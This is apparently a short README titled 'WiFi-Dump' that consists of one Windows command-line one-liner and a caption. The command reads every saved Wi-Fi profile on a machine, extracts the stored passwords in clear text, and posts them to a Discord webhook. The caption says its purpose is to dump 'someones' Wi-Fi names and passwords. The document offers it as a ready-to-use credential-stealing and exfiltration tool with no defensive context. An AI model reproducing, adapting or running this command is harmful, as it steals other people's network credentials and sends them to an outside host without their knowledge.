# WiFi-Dump

```bash
cmd /v:on /c "set "OUT=" & for /f "skip=9 tokens=1,2 delims=:" %i in ('netsh wlan show profiles') do @if "%j" NEQ " " (set OUT=!OUT!SSID: %j`r`n & for /f "delims=" %k in ('netsh wlan show profiles "%j" key=clear ^| findstr "Key Content"') do @set OUT=!OUT!%k`r`n) & powershell -NoProfile -Command "$c=@{content=('```'+$env:OUT+'```')}|ConvertTo-Json; Invoke-RestMethod -Uri 'https://discord.com/api/webhooks/1563584494290604082/PASTE_FULL_TOKEN_HERE' -Method Post -Body $c -ContentType 'application/json'"
```

## Dump someones WiFi SSID and Passwords and send them all to a Discord Webhook
